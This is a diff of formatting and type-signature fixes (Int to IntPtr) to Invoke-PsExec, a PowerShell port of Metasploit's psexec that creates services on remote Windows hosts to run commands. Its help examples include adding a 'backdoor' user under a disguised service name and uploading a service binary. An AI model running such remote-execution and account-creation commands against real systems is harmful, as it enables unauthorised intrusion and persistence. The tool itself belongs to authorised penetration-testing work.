@@ -1,80 +1,90 @@
 function Invoke-PsExec {
-    <#
+<#
     .SYNOPSIS
-    This function is a rough port of Metasploit's psexec functionality.
-    It utilizes Windows API calls to open up the service manager on
-    a remote machine, creates/run a service with an associated binary
-    path or command, and then cleans everything up.
 
-    Either a -Command or a custom -ServiceEXE can be specified.
-    For -Commands, a -ResultsFile can also be specified to retrieve the
-    results of the executed command.
+        This function is a rough port of Metasploit's psexec functionality.
+        It utilizes Windows API calls to open up the service manager on
+        a remote machine, creates/run a service with an associated binary
+        path or command, and then cleans everything up.
 
-    Adapted from MSF's version (see links).
+        Either a -Command or a custom -ServiceEXE can be specified.
+        For -Commands, a -ResultsFile can also be specified to retrieve the
+        results of the executed command.
 
-    Author: @harmj0y
-    License: BSD 3-Clause
+        Adapted from MSF's version (see links).
+
+        Author: @harmj0y
+        License: BSD 3-Clause
 
     .PARAMETER ComputerName
-    ComputerName to run the command on.
+
+        ComputerName to run the command on.
 
     .PARAMETER Command
-    Binary path (or Windows command) to execute.
+
+        Binary path (or Windows command) to execute.
 
     .PARAMETER ServiceName
-    The name of the service to create, defaults to "TestSVC"
+
+        The name of the service to create, defaults to "TestSVC"
 
     .PARAMETER ResultFile
-    If you want results from your command, specify this flag.
-    Name of the file to write the results to locally, defaults to
-    copying in the temporary result file to the local location.
+
+        Switch. If you want results from your command, specify this flag.
+        Name of the file to write the results to locally, defaults to
+        copying in the temporary result file to the local location.
 
     .PARAMETER ServiceEXE
-    Local service binary to upload/execute on the remote host
-    (instead of a command to execute).
+
+        Local service binary to upload/execute on the remote host
+        (instead of a command to execute).
 
     .PARAMETER NoCleanup
-    Don't remove the service after starting it (for ServiceEXEs).
+
+        Don't remove the service after starting it (for ServiceEXEs).
 
     .EXAMPLE
-    > Invoke-PsExec -ComputerName 192.168.50.200 -Command "net user backdoor password123 /add" -ServiceName Updater32
 
-    Creates a user named backdoor on the 192.168.50.200 host, with the
-    temporary service being named 'Updater32'.
+        PS C:\> Invoke-PsExec -ComputerName 192.168.50.200 -Command "net user backdoor password123 /add" -ServiceName Updater32
 
-    .EXAMPLE
-    > Invoke-PsExec -ComputerName 192.168.50.200 -Command "dir C:\" -ServiceName Updater32 -ResultFile "results.txt"
-
-    Runs the "dir C:\" command on 192.168.50.200 with a temporary service named 'Updater32', 
-    and copies the result file to "results.txt" on the local path.
+        Creates a user named backdoor on the 192.168.50.200 host, with the
+        temporary service being named 'Updater32'.
 
     .EXAMPLE
-    > Invoke-PsExec -ComputerName 192.168.50.200 -ServiceName Updater32 -ServiceEXE "service.exe"
 
-    Uploads "service.exe" to the remote host, registers/starts it as a service with name
-    'Updater32', and removes the service/binary after it runs (or fails to respond w/in 30 seconds).
+        PS C:\> Invoke-PsExec -ComputerName 192.168.50.200 -Command "dir C:\" -ServiceName Updater32 -ResultFile "results.txt"
+
+        Runs the "dir C:\" command on 192.168.50.200 with a temporary service named 'Updater32', 
+        and copies the result file to "results.txt" on the local path.
+
+    .EXAMPLE
+
+        PS C:\> Invoke-PsExec -ComputerName 192.168.50.200 -ServiceName Updater32 -ServiceEXE "service.exe"
+
+        Uploads "service.exe" to the remote host, registers/starts it as a service with name
+        'Updater32', and removes the service/binary after it runs (or fails to respond w/in 30 seconds).
 
     .LINK
-    https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/psexec.rb
-    https://github.com/rapid7/metasploit-framework/blob/master/tools/psexec.rb
-    #>
 
+        https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/psexec.rb
+        https://github.com/rapid7/metasploit-framework/blob/master/tools/psexec.rb
+#>
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $True)] 
-        [string]
+        [String]
         $ComputerName,
 
-        [string]
+        [String]
         $Command,
 
-        [string]
+        [String]
         $ServiceName = "TestSVC",
 
-        [string]
+        [String]
         $ResultFile,
 
-        [string]
+        [String]
         $ServiceEXE,
 
         [switch]
@@ -163,14 +173,14 @@ function Invoke-PsExec {
     {
         param(
             [Parameter(Mandatory = $True)] 
-            [string]
+            [String]
             $ComputerName,
 
             [Parameter(Mandatory = $True)]
-            [string]
+            [String]
             $Command,
 
-            [string]
+            [String]
             $ServiceName = "TestSVC",
 
             [switch]
@@ -184,23 +194,23 @@ function Invoke-PsExec {
         $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    
 
         $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
-        $OpenSCManagerADelegate = Get-DelegateType @( [string], [string], [Int]) ([IntPtr])
+        $OpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])
         $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
         
         $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
-        $OpenServiceADelegate = Get-DelegateType @( [Int], [String], [Int]) ([Int])
+        $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])
         $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)
       
         $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
-        $CreateServiceADelegate = Get-DelegateType @( [Int], [string], [string], [Int], [Int], [Int], [Int], [string], [string], [Int], [Int], [Int], [Int]) ([IntPtr])
+        $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
         $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)
 
         $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
-        $StartServiceADelegate = Get-DelegateType @( [Int], [Int], [Int]) ([Int])
+        $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([IntPtr])
         $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)
 
         $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
-        $DeleteServiceDelegate = Get-DelegateType @( [Int] ) ([Int])
+        $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])
         $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)
 
         $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
